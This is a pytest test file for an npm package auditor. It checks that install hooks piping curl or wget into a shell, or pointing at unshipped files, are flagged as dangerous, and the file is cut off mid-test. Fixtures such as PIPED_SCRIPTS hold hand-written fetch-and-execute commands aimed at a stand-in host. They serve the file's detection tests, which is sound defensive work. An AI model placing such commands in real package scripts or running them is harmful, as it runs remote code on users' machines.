# CLASS MAP — the dealbreaker path: the two structural checks (inventory) and the
# hardcoded-DANGEROUS short-circuit they trigger (pipeline). The ONE path where
# DANGEROUS is asserted with no hypothesis, no experiment and no judge.
# Units: analyze_inventory(package_dir) -> InventoryReport.{dealbreaker,flags};
#        AuditPipeline.run(...) -> the report a consumer receives, the frames it
#        saw, or the exception it gets instead.
# Blackbox: a package on disk in, a report / exception / durable event log out.
#
# Seam: the LLM provider is ScriptedLlm({}) — NO script for ANY role — so the
# first model call of any later phase raises AssertionError. That is how "no phase
# after inventory ran" is observed from outside the pipeline; C19 swaps in a real
# scripted provider for the contrast.
#
# INPUT PROVENANCE. A package.json is external, so the NEGATIVE direction runs
# real captured manifests (C5b extracts the committed npm tarballs and audits the
# real tree, file modes and script values). The POSITIVE direction cannot be
# captured: the producer of a `curl … | sh` install hook is malware, and the only
# such corpus here is banned from committed files. Those script strings are
# therefore hand-authored adversary text — mitigated by pairing every one with a
# near-miss (C5a) and with the real manifests, so a regex matching nothing, or
# matching everything, fails this file. PUBLISHED_HOOKS holds install-script
# values copied verbatim out of published manifests, each naming its package —
# every one a BENIGN shape a narrow recogniser calls DANGEROUS.
#
# THREE OUTCOMES, NOT TWO. An install hook whose target cannot be resolved is a
# statement about THIS ENGINE, not about the package, so it cannot carry the
# dealbreaker's accusation — over 227 published packages with lifecycle hooks,
# unresolvable install hooks are dominated by ordinary native-build tooling. It is
# still a coverage gap that must never reach SAFE, so it is a `critical`
# `install-coverage-gap` flag under ONE closed name: a consumer refusing SAFE
# branches on one fact rather than on a list of gap kinds that grows.
#
# Axes: which check trips × the scripts block's shape × manifest health × what the
#       consumer receives (verdict, report shape, frames, persistability)
#
# C1-C5   shell-pipe: detail names the script key and value; every pattern incl.
#         re.I; every script key scanned, not just lifecycle hooks; the early
#         return suppresses advisory flags (paired with a control run that
#         produces them); the false-positive direction — near misses (C5a) and
#         two real published manifests (C5b)
# C6-C11  missing-install-script: an install hook naming a file the tarball does
#         not ship; the pairing where it does; runtime `main` is NOT checked
#         (nothing executes it at install time); reference normalization; the
#         interpreter is not the fact (`sh`/`bash`/`python3`/absolute path/bare
#         shebang all count); shell-pipe wins when both trip
# C20-C27 the install-time hook set and the coverage gap: `prepare`/`prepublish`
#         are BUILD-time and npm never runs them for a registry tarball; an
#         unresolvable hook is a gap, not a dealbreaker; a shipped `.sh` target is
#         coverage (asserted through flag_source_files, not through an absent
#         flag); targets resolve the way the LOADER resolves them; each command of
#         a compound hook is classified separately; degenerate values are a gap,
#         never a crash, never clean
# C28     an extensionless file is classified by its `#!` line, because that is
#         what the kernel obeys — 13 of 94 real `bin` targets ship extensionless.
#         The mapping is ONE-WAY: a name wins where there is one, so a `.json`
#         whose first line looks like a shebang is still json
# C29-C31 refusing SAFE while a gap is open (NPMGUARD_REFUSE_INSTALL_COVERAGE_GAP).
#         The verdict vocabulary is {SAFE, DANGEROUS}, so "we could not check what
#         runs at install time" HAS no verdict — refused like a DEFERRED
#         hypothesis, same code. Knob OFF is the default and therefore the
#         subject (C29b). A dealbreaker still wins (C30); so does a CONFIRMED
#         hypothesis (C31) — the gap can displace an absent verdict, never a
#         proven one, or confirmed malware would be discarded over an unreadable
#         `node-gyp rebuild`
# C12-C15 the scripts block and manifest health: `{}` / absent / non-string values
#         are neither a trip nor a crash; a manifest that does not PARSE is
#         AuditIncompleteError, not an empty dict — an empty dict made both checks
#         pass trivially and the only direction that biased was toward SAFE
# C16-C19 what ships: the whole report shape for both checks (zero hypotheses is
#         the contract, so the assertion is the shape and not the verdict string);
#         the frames, and the absence of any later phase's; the hand-built report
#         is still persistable; a package tripping neither check proceeds normally
from __future__ import annotations

import json
import tarfile
from pathlib import Path
from types import SimpleNamespace

import pytest

from kit_llm import ScriptedLlm
from kit_spine import make_engine, make_session_factory
from kit_spine.db import metadata
from kit_spine.notify_polling import PollingNotifier
from kit_stream import StreamService
from npmguard import pipeline as pipeline_module
from npmguard import report_store
from npmguard.config import Settings
from npmguard.contract.models import Claim, EvidenceRef, FocusRange, Hypothesis, ToolCall
from npmguard.errors import AuditIncompleteError
from npmguard.events import AuditEmitter, sse_events
from npmguard.inventory import (
    BUILD_TIME_HOOKS,
    INSTALL_COVERAGE_GAP,
    INSTALL_TIME_HOOKS,
    analyze_inventory,
)
from npmguard.llm_runtime import build_npmguard_llm
from npmguard.orchestrator import OrchestratorSummary
from npmguard.persistence import AuditSessionStore
from npmguard.phases import flag_source_files
from npmguard.pipeline import AuditPipeline
from npmguard.resolve import ResolvedPackage

PACKAGE_NAME = "dealbreaker-under-test"
PACKAGE_VERSION = "2.0.1"
BENIGN_HOOK = "node setup.js"
SETUP_SOURCE = "module.exports = 1;\n"
ELF_MAGIC = b"\x7fELF\x02\x01\x01\x00payload"
REGISTRY_FIXTURES = Path(__file__).parent / "fixtures" / "registry"
# Hand-authored adversary text (see INPUT PROVENANCE above): one literal per
# SHELL_PIPE_PATTERNS alternative, plus one upper-cased to exercise re.I.
PIPED_SCRIPTS = {
    "curl-into-sh": "curl https://evil.example/i.sh | sh",
    "curl-into-bash": "curl https://evil.example/i.sh | bash",
    "wget-into-sh": "wget https://evil.example/i.sh | sh",
    "wget-into-bash": "wget https://evil.example/i.sh | bash",
    "curl-into-anything": "curl https://evil.example/i.js | node -",
    "wget-file-then-sh": "wget -O /tmp/i.sh https://evil.example/i.sh && sh /tmp/i.sh",
    "wget-file-then-chmod": "wget -O /tmp/i https://evil.example/i && chmod +x /tmp/i",
    "upper-cased": "CURL HTTPS://EVIL.EXAMPLE/I.SH | SH",
}
# Install-hook commands copied VERBATIM out of published manifests, each with the
# package it came from. These are not adversary text and not invented: every one is
# a benign, widely-installed package, and every one is a shape a narrow recogniser
# gets wrong (C20-C24). Provenance is the installed tree — the bytes npm
# actually ships — surveyed over 1334 unique (name, version) manifests, 227 of them
# declaring a lifecycle hook. Committing those tarballs is out of proportion for a
# one-line `scripts` value, so the package@version is named instead and the survey
# is reproducible against any installed tree.
PUBLISHED_HOOKS = {
    # protobufjs@7.5.4 / @8.0.0 — ships scripts/postinstall.js; node resolves it.
    "extensionless-node-target": "node scripts/postinstall",
    # msw@2.15.0 — inline code, readable as a FILENAME by a naive extractor.
    "inline-node-code": "node -e \"import('./config/scripts/postinstall.js').catch(() => void 0)\"",
    # node-pty@1.1.0 (the `||` branch of its install hook).
    "native-rebuild": "node-gyp rebuild",
    # keytar@7.9.0.
    "prebuilt-binary": "prebuild-install || node-gyp rebuild",
    # tree-sitter-bash@0.25.1.
    "gyp-build": "node-gyp-build",
    # @lezer/lr@1.4.9 — splitting without the `;` yields the literal `build.js;`.
    "compound-node-then-tsc": "node build.js; tsc src/constants.ts -d --outDir dist",
    # whatwg-url@14.2.0's `prepare`: runs a script its own `files` keeps out of the
    # tarball, which is legal because `prepare` never runs for a tarball dependency.
    "dev-only-prepare": "node scripts/transform.js",
}
NEAR_MISSES = {
    "node-hook": BENIGN_HOOK,
    "curl-without-pipe": "curl -o vendor.tgz https://registry.example/vendor.tgz",
    "pipe-without-fetcher": "cat notes.txt | sh",
    "wget-without-o-or-and": "wget https://registry.example/vendor.tgz",
}


def _manifest(**overrides) -> str:
    package = {"name": PACKAGE_NAME, "version": PACKAGE_VERSION, "main": "index.js"}
    package.update(overrides)
    return json.dumps(package)


def _write(root: Path, files: dict[str, str | bytes]) -> Path:
    package = root / "package"
    package.mkdir(parents=True)
    for name, content in files.items():
        target = package / name
        target.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            target.write_bytes(content)
        else:
            target.write_text(content, encoding="utf-8")
    return package


def _hook_package(script: str, hook: str = "preinstall", **files: str) -> dict[str, str]:
    return {
        "package.json": _manifest(scripts={hook: script}),
        "index.js": SETUP_SOURCE,
        "setup.js": SETUP_SOURCE,
        **files,
    }


def _extract_registry_tarball(tarball: Path, destination: Path) -> Path:
    with tarfile.open(tarball) as archive:
        archive.extractall(destination, filter="data")
    return destination / "package"


def _frame_types(frames: list[dict]) -> list[str]:
    return [frame["type"] for frame in frames]


@pytest.fixture
async def audit(tmp_path, monkeypatch):
    """Run AuditPipeline.run over a package materialized on disk, and hand back
    the report, the durable frames a consumer would have seen, and the ids."""
    opened: list[tuple[object, object]] = []
    runs = 0

    async def _run(files: dict[str, str | bytes], *, provider=None) -> SimpleNamespace:
        nonlocal runs
        runs += 1
        monkeypatch.setenv("NPMGUARD_AUDIT_LOG_DIR", str(tmp_path / f"logs{runs}"))
        engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / f'state{runs}.sqlite3'}")
        async with engine.begin() as connection:
            await connection.run_sync(metadata.create_all)
        factory = make_session_factory(engine)
        settings = Settings(_env_file=None)
        # No script for any role: a later phase's first LLM call fails loudly.
        llm = build_npmguard_llm(factory, settings, provider=provider or ScriptedLlm({}))
        opened.append((engine, llm))
        sessions = AuditSessionStore(factory)
        stream = StreamService(factory, PollingNotifier())
        workdir = tmp_path / f"work{runs}"
        package = _write(workdir, files)

        async def _resolve(package_name: str, version: str | None = None) -> ResolvedPackage:
            return ResolvedPackage(path=package, workdir=workdir)

        monkeypatch.setattr(pipeline_module, "resolve_package", _resolve)
        session = await sessions.create(PACKAGE_NAME, PACKAGE_VERSION)
        pipeline = AuditPipeline(settings, llm, sessions)
        emitter = AuditEmitter(session.audit_id, stream)
        try:
            result = await pipeline.run(
                PACKAGE_NAME, audit_id=session.audit_id, version=PACKAGE_VERSION, emitter=emitter
            )
        finally:
            # Drained even when run() raises, and parked on the fixture function so
            # a test asserting on an EXCEPTION can still inspect what the viewer saw
            # (there is no result object to hang it off in that case).
            self_frames = []
            async for frame in sse_events(session.audit_id, stream, follow=False):
                line = next(part for part in frame.splitlines() if part.startswith("data: "))
                self_frames.append(json.loads(line.removeprefix("data: ")))
            _run.frames = self_frames
        return SimpleNamespace(
            report=result.report,
            frames=self_frames,
            audit_id=session.audit_id,
            package=package,
        )

    _run.frames = []
    yield _run
    for engine, llm in opened:
        await llm.aclose()
        await engine.dispose()


# --------------------------------------------------------------------------- #
# DEALBREAKER 1 — shell-pipe
# --------------------------------------------------------------------------- #


async def test_piped_install_script_is_a_dealbreaker(tmp_path) -> None:
    """C1: the check names itself and quotes the script that tripped it."""
    package = _write(tmp_path, _hook_package(PIPED_SCRIPTS["curl-into-sh"]))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "shell-pipe"
    assert "'preinstall'" in inventory.dealbreaker.detail
    assert PIPED_SCRIPTS["curl-into-sh"] in inventory.dealbreaker.detail


@pytest.mark.parametrize("name", sorted(PIPED_SCRIPTS))
async def test_every_shell_pipe_pattern_trips(tmp_path, name: str) -> None:
    """C2: one case per SHELL_PIPE_PATTERNS alternative, plus an upper-cased one
    for re.I. A pattern that matched nothing would show up here as one green
    parametrization turning red, not as a silently unreachable branch."""
    package = _write(tmp_path, _hook_package(PIPED_SCRIPTS[name]))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None, PIPED_SCRIPTS[name]
    assert inventory.dealbreaker.check == "shell-pipe"


async def test_shell_pipe_is_matched_in_a_non_lifecycle_script(tmp_path) -> None:
    """C3: the scan covers EVERY script key. `npm install` never runs `build`, so
    this is a DANGEROUS verdict for a script no installer would execute — the
    check's declared breadth, pinned where a narrowing would be visible."""
    package = _write(tmp_path, _hook_package(PIPED_SCRIPTS["curl-into-sh"], hook="build"))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "shell-pipe"
    assert "'build'" in inventory.dealbreaker.detail


async def test_dealbreaker_suppresses_every_advisory_flag(tmp_path) -> None:
    """C4: the early return returns ([], dealbreaker). Paired with the identical
    package under a benign hook, which DOES produce the three flags — otherwise
    `flags == []` would prove nothing about suppression."""
    files = {
        "package.json": _manifest(scripts={"preinstall": BENIGN_HOOK}),
        "setup.js": SETUP_SOURCE,
        ".secret-token": "abc\n",
        "payload.bin": ELF_MAGIC,
    }
    control = await analyze_inventory(_write(tmp_path / "control", files))
    assert control.dealbreaker is None
    assert {flag.check for flag in control.flags} == {
        "lifecycle-scripts",
        "binary-detected",
        "hidden-dotfile",
    }

    tripped = dict(files)
    tripped["package.json"] = _manifest(scripts={"preinstall": PIPED_SCRIPTS["curl-into-sh"]})
    inventory = await analyze_inventory(_write(tmp_path / "tripped", tripped))
    assert inventory.dealbreaker is not None
    assert inventory.flags == []


@pytest.mark.parametrize("name", sorted(NEAR_MISSES))
async def test_near_misses_do_not_trip_the_shell_pipe_check(tmp_path, name: str) -> None:
    """C5a: a false dealbreaker is a DANGEROUS verdict on a clean package, so the
    negative direction is enumerated too: no fetcher, no pipe, or neither."""
    package = _write(tmp_path, _hook_package(NEAR_MISSES[name]))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None, NEAR_MISSES[name]


@pytest.mark.parametrize(
    ("tarball", "expected_name"),
    [
        ("chalk/chalk-5.6.2.tgz", "chalk"),
        ("is-number/is-number-7.0.0.tgz", "is-number"),
    ],
)
async def test_real_published_packages_trip_nothing(tmp_path, tarball, expected_name) -> None:
    """C5b: real captured input — the manifests, trees and file modes npm actually
    published, extracted from the committed registry tarballs. `scripts` is
    asserted non-empty so the shell-pipe scan really did iterate over published
    script values; an empty dict would make the None dealbreaker vacuous."""
    package = _extract_registry_tarball(REGISTRY_FIXTURES / tarball, tmp_path)
    inventory = await analyze_inventory(package)
    assert inventory.metadata.name == expected_name
    assert inventory.scripts, "no published scripts to scan — the assertion below is vacuous"
    assert inventory.dealbreaker is None


# --------------------------------------------------------------------------- #
# DEALBREAKER 2 — missing-install-script
# --------------------------------------------------------------------------- #


async def test_install_hook_referencing_an_absent_file_is_a_dealbreaker(tmp_path) -> None:
    """C6: the manifest says `npm install` will run a file the package does not
    contain, so what executes cannot be audited at all."""
    package = _write(
        tmp_path,
        {"package.json": _manifest(scripts={"postinstall": BENIGN_HOOK}), "index.js": SETUP_SOURCE},
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "missing-install-script"
    assert "'setup.js'" in inventory.dealbreaker.detail


async def test_install_hook_referencing_a_present_file_is_clean(tmp_path) -> None:
    """C7: the pairing — the same hook with the file shipped is not a dealbreaker,
    so C6 pins the missing file rather than the hook."""
    package = _write(tmp_path, _hook_package(BENIGN_HOOK, hook="postinstall"))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None
    assert inventory.entryPoints.install == ["setup.js"]


async def test_missing_runtime_entry_point_is_not_a_dealbreaker(tmp_path) -> None:
    """C8: only install-time references are checked. A `main` that points nowhere
    breaks `require`, but nothing executes it during `npm install`."""
    package = _write(
        tmp_path,
        {"package.json": _manifest(main="dist/absent.js"), "index.js": SETUP_SOURCE},
    )
    inventory = await analyze_inventory(package)
    assert inventory.entryPoints.runtime == ["dist/absent.js"]
    assert inventory.dealbreaker is None


async def test_install_reference_paths_are_normalized(tmp_path) -> None:
    """C9: `./setup.js` is the file `setup.js` (Path normalization), while a
    subdirectory reference must match the shipped path exactly."""
    dotted = await analyze_inventory(_write(tmp_path / "dotted", _hook_package("node ./setup.js")))
    assert dotted.entryPoints.install == ["setup.js"]
    assert dotted.dealbreaker is None

    nested = await analyze_inventory(
        _write(
            tmp_path / "nested",
            {
                "package.json": _manifest(scripts={"preinstall": "node lib/setup.js"}),
                "lib/setup.js": SETUP_SOURCE,
            },
        )
    )
    assert nested.entryPoints.install == ["lib/setup.js"]
    assert nested.dealbreaker is None

    misplaced = await analyze_inventory(
        _write(tmp_path / "misplaced", _hook_package("node lib/setup.js"))
    )
    assert misplaced.dealbreaker is not None
    assert misplaced.dealbreaker.check == "missing-install-script"


@pytest.mark.parametrize(
    "command",
    [
        "sh install.sh",
        "bash ./install.sh",
        "python3 install.sh",
        "/bin/sh install.sh",
        "./install.sh",
    ],
)
async def test_non_node_install_hook_with_an_absent_target_is_a_dealbreaker(
    tmp_path, command: str
) -> None:
    """C10: the interpreter is NOT the fact the check turns on — the FACT is. A hook
    naming a file the tarball does not ship is a dealbreaker whatever reads it; an
    absolute interpreter path does not evade it; and neither does dropping the
    interpreter so the shebang runs the file (`./install.sh`), which is the same
    fact with the interpreter written inside the file instead of beside it. Reading
    a reference only out of a `node …` command let every other interpreter walk
    through with an advisory warn."""
    package = _write(
        tmp_path,
        {"package.json": _manifest(scripts={"install": command}), "index.js": SETUP_SOURCE},
    )
    inventory = await analyze_inventory(package)
    assert inventory.entryPoints.install == ["install.sh"]
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "missing-install-script"
    assert "'install'" in inventory.dealbreaker.detail
    assert "'install.sh'" in inventory.dealbreaker.detail


async def test_shell_pipe_wins_over_missing_install_script(tmp_path) -> None:
    """C11: a manifest tripping both is reported as shell-pipe, because the pipe
    scan runs first and returns. The rationale a user reads depends on this."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={
                    "preinstall": "node absent-setup.js",
                    "postinstall": PIPED_SCRIPTS["curl-into-sh"],
                }
            ),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "shell-pipe"


# --------------------------------------------------------------------------- #
# THE INSTALL-TIME HOOK SET, AND THE COVERAGE GAP
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("hook", sorted(BUILD_TIME_HOOKS))
async def test_build_time_hooks_name_no_install_entry_point(tmp_path, hook: str) -> None:
    """C20: `prepare` and `prepublish` are not install-time. npm runs them for the
    ROOT project on a bare `npm install`, on pack/publish, for a link install and
    for a git dependency — never for a registry tarball installed as a dependency,
    which is the only artifact resolve.py fetches (npm 12,
    docs/content/using-npm/scripts.md, "Life Cycle Operation Order"). So a
    reference they carry is not install-time execution and cannot be a dealbreaker.
    This is not a softening, it is a measured false-positive fix: 11 of the 14
    published packages the old check called DANGEROUS across 1334 installed
    manifests were this exact shape — a `prepare` running a build script the
    manifest's own `files` keeps out of the tarball. The hook is still REPORTED, so
    the report does not lose the fact that it exists."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(scripts={hook: PUBLISHED_HOOKS["dev-only-prepare"]}),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.entryPoints.install == []
    assert inventory.dealbreaker is None
    assert f"lifecycle hooks: {hook}" in next(
        flag.detail for flag in inventory.flags if flag.check == "lifecycle-scripts"
    )
    assert "install-coverage-gap" not in {flag.check for flag in inventory.flags}


@pytest.mark.parametrize(
    "name", ["inline-node-code", "native-rebuild", "prebuilt-binary", "gyp-build"]
)
async def test_unresolvable_install_hook_is_a_located_coverage_gap(tmp_path, name: str) -> None:
    """C21: the third outcome, which did not exist before. These four are REAL
    published install hooks (see PUBLISHED_HOOKS) that no file in the tarball can
    account for: inline `-e` code, and three native-build front ends. They are not
    dealbreakers — condemning them would condemn every native addon on the registry
    — but they are not clean either, so each leaves a `critical`
    `install-coverage-gap` flag quoting the hook and the command. That flag is the
    one closed fact a consumer can branch on to refuse SAFE."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(scripts={"install": PUBLISHED_HOOKS[name]}),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None
    gaps = [flag for flag in inventory.flags if flag.check == "install-coverage-gap"]
    assert len(gaps) == 1, inventory.flags
    assert gaps[0].severity == "critical"
    assert "'install'" in gaps[0].detail
    assert PUBLISHED_HOOKS[name] in gaps[0].detail


async def test_a_fully_resolved_install_hook_leaves_no_coverage_gap(tmp_path) -> None:
    """C21b: the pairing that stops C21 being vacuous — an install hook whose
    target ships AND is a file type FLAG reads produces no gap flag at all. Without
    this, a bug that flagged every package would pass C21."""
    inventory = await analyze_inventory(_write(tmp_path, _hook_package(BENIGN_HOOK, hook="install")))
    assert inventory.dealbreaker is None
    assert {flag.check for flag in inventory.flags} == {"lifecycle-scripts"}


async def test_a_shipped_shell_install_target_is_analysed(tmp_path) -> None:
    """C22: the legitimate case the widened check must not break, and the half of it
    that used to be a residue. `sh ./scripts/postinstall.sh` WITH the file shipped is
    not a dealbreaker and the reference is recorded — otherwise the fix would be a
    false-positive machine. It is now also COVERAGE rather than a named gap: `shell`
    is in SOURCE_FILE_TYPES, so `flag_source_files` puts the .sh in front of a model,
    which is what "resolved" was previously read as claiming and did not deliver.
    Asserted through flag_source_files itself, not through the absence of a flag —
    absence alone would also pass if the file had simply stopped being noticed."""
    shell = await analyze_inventory(
        _write(
            tmp_path / "shell",
            {
                "package.json": _manifest(scripts={"install": "sh ./scripts/postinstall.sh"}),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.sh": "echo installing\n",
            },
        )
    )
    assert shell.dealbreaker is None
    assert shell.entryPoints.install == ["scripts/postinstall.sh"]
    assert INSTALL_COVERAGE_GAP not in {flag.check for flag in shell.flags}
    assert "scripts/postinstall.sh" in {file.path for file in flag_source_files(shell)}

    analysed = await analyze_inventory(
        _write(
            tmp_path / "analysed",
            {
                "package.json": _manifest(scripts={"install": "sh ./scripts/postinstall.js"}),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.js": SETUP_SOURCE,
            },
        )
    )
    assert INSTALL_COVERAGE_GAP not in {flag.check for flag in analysed.flags}


async def test_a_shipped_target_no_model_reads_is_still_a_coverage_gap(tmp_path) -> None:
    """C22b: the pairing that keeps C22 from making the second gap KIND unreachable.
    `python scripts/postinstall.py` resolves — python is in SCRIPT_INTERPRETERS and
    the file ships — but no extension mapping exists for `.py`, so it classifies
    `unknown`, no model reads it, and the gap stands with the file named. Widening
    SOURCE_FILE_TYPES converts gaps into coverage one type at a time; it must not
    quietly retire the branch that reports the types still left out."""
    inventory = await analyze_inventory(
        _write(
            tmp_path,
            {
                "package.json": _manifest(scripts={"install": "python scripts/postinstall.py"}),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.py": "print('installing')\n",
            },
        )
    )
    assert inventory.dealbreaker is None
    assert inventory.entryPoints.install == ["scripts/postinstall.py"]
    gap = next(flag for flag in inventory.flags if flag.check == INSTALL_COVERAGE_GAP)
    assert gap.file == "scripts/postinstall.py"
    assert gap.severity == "critical"
    assert "unknown" in gap.detail
    assert "scripts/postinstall.py" not in {file.path for file in flag_source_files(inventory)}


SHEBANGS = {
    "env-node": ("#!/usr/bin/env node\nconsole.log(1)\n", "js"),
    "absolute-node": ("#!/usr/local/bin/node\nconsole.log(1)\n", "js"),
    "env-dash-s-node": ("#!/usr/bin/env -S node --enable-source-maps\nconsole.log(1)\n", "js"),
    "bun": ("#!/usr/bin/env bun\nconsole.log(1)\n", "js"),
    "posix-sh": ("#!/bin/sh\necho hi\n", "shell"),
    "env-bash": ("#!/usr/bin/env bash\necho hi\n", "shell"),
    # Resolves to an interpreter no FLAG prompt has been validated on, so it stays
    # `unknown` — which is what keeps it a REPORTED gap instead of silently clean.
    "python": ("#!/usr/bin/env python3\nprint(1)\n", "unknown"),
    "no-shebang": ("MIT License\n\nCopyright…\n", "unknown"),
    "hash-but-not-bang": ("# not a shebang\n", "unknown"),
}


@pytest.mark.parametrize("name", sorted(SHEBANGS))
async def test_an_extensionless_file_is_classified_by_its_shebang(tmp_path, name: str) -> None:
    """C28: a `#!` line is the file's own declaration of its language and it is what
    the kernel obeys, so an extensionless file carrying one is classified by it. 13 of
    94 real `bin` targets ship extensionless (typescript's bin/tsc, rollup, esbuild,
    acorn, uuid): each was `unknown`, read by no model, and NOT caught by
    `executable-outside-bin` either because it sits under `bin/`. So a DECLARED
    executable entry point reached nothing. The negative rows matter as much: an
    unmapped interpreter and a file with no shebang at all stay `unknown`."""
    content, expected = SHEBANGS[name]
    inventory = await analyze_inventory(
        _write(
            tmp_path,
            {
                "package.json": _manifest(bin={"tool": "bin/tool"}),
                "index.js": SETUP_SOURCE,
                "bin/tool": content,
            },
        )
    )
    record = next(file for file in inventory.files if file.path == "bin/tool")
    assert record.fileType == expected, content
    assert record.isBinary is False
    reads = {file.path for file in flag_source_files(inventory)}
    assert ("bin/tool" in reads) is (expected in ("js", "shell"))


async def test_a_shebang_never_overrides_a_name_or_a_magic_number(tmp_path) -> None:
    """C28b: the mapping is one-way. An extension IS a declaration and the vast
    majority of files carry a true one, so the name wins where there is one — a
    `.json` whose first line happens to read like a shebang is still `json`, and an
    ELF is still `binary`. Without this the change could DEMOTE a file that is read
    today, or hand FLAG a binary blob as if it were source."""
    inventory = await analyze_inventory(
        _write(
            tmp_path,
            {
                "package.json": _manifest(),
                "index.js": SETUP_SOURCE,
                "weird.json": '#!/usr/bin/env node\n{"a": 1}\n',
                "payload": ELF_MAGIC,
            },
        )
    )
    types = {file.path: file.fileType for file in inventory.files}
    assert types["weird.json"] == "json"
    assert types["payload"] == "binary"
    assert next(file for file in inventory.files if file.path == "payload").isBinary is True


async def test_a_target_is_resolved_the_way_node_resolves_it(tmp_path) -> None:
    """C23: the resolver has to agree with the loader that will actually run the
    file, or it invents missing files. `node scripts/postinstall` executes
    `scripts/postinstall.js` (verified by execution: `node dir/postinstall` loads
    `postinstall.js`), and `node .` reads `main` out of the directory's
    package.json. protobufjs@7.5.4 and @8.0.0 ship the first shape and were
    DANGEROUS under the old exact-path match. Extension search is node's rule, not
    a general one — `sh scripts/postinstall` gets no such favour, since sh would
    not find it either. And only the options BEFORE the first operand decide
    whether code came inline, so a `-e` belonging to the SCRIPT does not erase the
    script."""
    extensionless = await analyze_inventory(
        _write(
            tmp_path / "extensionless",
            {
                "package.json": _manifest(
                    scripts={"postinstall": PUBLISHED_HOOKS["extensionless-node-target"]}
                ),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.js": SETUP_SOURCE,
            },
        )
    )
    assert extensionless.dealbreaker is None

    directory = await analyze_inventory(
        _write(
            tmp_path / "directory",
            {
                "package.json": _manifest(scripts={"postinstall": "node lib"}),
                "index.js": SETUP_SOURCE,
                "lib/index.js": SETUP_SOURCE,
            },
        )
    )
    assert directory.dealbreaker is None

    script_flag = await analyze_inventory(
        _write(
            tmp_path / "script-flag",
            {
                "package.json": _manifest(scripts={"install": "node build.js -e production"}),
                "index.js": SETUP_SOURCE,
                "build.js": SETUP_SOURCE,
            },
        )
    )
    assert script_flag.entryPoints.install == ["build.js"]
    assert "install-coverage-gap" not in {flag.check for flag in script_flag.flags}

    shell = await analyze_inventory(
        _write(
            tmp_path / "shell",
            {
                "package.json": _manifest(scripts={"install": "sh scripts/postinstall"}),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.js": SETUP_SOURCE,
            },
        )
    )
    assert shell.dealbreaker is not None
    assert shell.dealbreaker.check == "missing-install-script"


async def test_each_command_in_a_compound_hook_is_classified_separately(tmp_path) -> None:
    """C24: one hook can be several commands, and reading it as one word list gets
    both halves wrong. @lezer/lr@1.4.9 ships `node build.js; tsc …`, whose old
    reference was the literal `build.js;` — semicolon included, so no package could
    ever contain it. Now `build.js` resolves AND the `tsc` command is a gap, which
    is the honest reading of a hook that runs two programs."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={"postinstall": PUBLISHED_HOOKS["compound-node-then-tsc"]}
            ),
            "index.js": SETUP_SOURCE,
            "build.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None
    assert inventory.entryPoints.install == ["build.js"]
    gaps = [flag for flag in inventory.flags if flag.check == "install-coverage-gap"]
    assert len(gaps) == 1
    assert "'tsc'" in gaps[0].detail


async def test_a_fetch_then_execute_hook_the_pipe_patterns_miss_still_lands(tmp_path) -> None:
    """C25: SHELL_PIPE_PATTERNS only spells out the `wget -O … && …` half of
    fetch-then-execute; the curl spelling has no `|` and matches none of the six
    (C2 covers what does match). It lands anyway, and not because a seventh pattern
    was added: the second command hands `sh` a path the tarball does not contain,
    which is the same fact as C6/C10. That is the point of resolving targets rather
    than recognising attack strings — the shapes an alternation misses come out as
    a dealbreaker or a gap, never as clean.

    Hand-authored adversary text, as INPUT PROVENANCE explains for every offensive
    literal in this file: the only real producers are in the banned corpus."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={"install": "curl -o /tmp/i.sh https://evil.example/i.sh && sh /tmp/i.sh"}
            ),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "missing-install-script"
    assert "/tmp/i.sh" in inventory.dealbreaker.detail


async def test_install_references_are_ordered_by_hook_not_by_hash(tmp_path) -> None:
    """C26: `entryPoints.install` is derived by iterating the install-time hooks, so
    its order used to be frozenset iteration order over strings — which varies per
    PROCESS under hash randomization (measured: five seeds, five different orders).
    Two audits of identical bytes could therefore disagree on the order of this
    field, on which missing reference the dealbreaker rationale names, and on the
    hypothesize prompt, which renders this list verbatim (phases.py "## Entry
    points"). The manifest here declares the hooks in the reverse of run order to
    prove the output follows npm's order and not the manifest's.

    The constant is asserted directly as well, and that is not a restatement: a
    frozenset restores the defect while still yielding npm's order in 1 process out
    of 6 (measured — the observable-order assertion below survived 1 of 8 runs
    against that mutation), so the observable assertion alone is a flaky pin on a
    non-flaky bug."""
    assert INSTALL_TIME_HOOKS == ("preinstall", "install", "postinstall")
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={
                    "postinstall": "node third.js",
                    "install": "node second.js",
                    "preinstall": "node first.js",
                }
            ),
            "index.js": SETUP_SOURCE,
            "first.js": SETUP_SOURCE,
            "second.js": SETUP_SOURCE,
            "third.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.entryPoints.install == ["first.js", "second.js", "third.js"]


@pytest.mark.parametrize(
    "command",
    [
